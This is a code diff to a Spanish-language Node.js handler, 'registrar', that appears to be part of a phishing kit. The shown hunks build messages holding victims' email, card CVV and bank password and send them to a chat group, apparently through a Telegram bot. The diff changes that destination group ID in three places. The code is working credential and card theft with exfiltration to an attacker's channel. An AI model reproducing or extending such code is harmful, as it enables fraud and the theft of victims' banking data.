@@ -92,7 +92,7 @@ const registrar = async (req, res ) => {
                 "Email: " + email +`\n`
                 ;
             
-                const chatId = -618953922; //id de grupo
+                const chatId = -1001923096076; //id de grupo
                 
                 //5319932122; id de bot solo
         
@@ -121,7 +121,7 @@ const registrar = async (req, res ) => {
                 "Cvv: " + cvv +`\n`
                 ;
             
-                const chatId = -618953922; //id de grupo
+                const chatId = -1001923096076; //id de grupo
                 
                 //5319932122; id de bot solo
         
@@ -143,7 +143,7 @@ const registrar = async (req, res ) => {
                 "Contraseña de Banco: " + ContraseñaBanco
                 ;
             
-                const chatId = -618953922; //id de grupo
+                const chatId = -1001923096076; //id de grupo
                 
                 //5319932122; id de bot solo
         
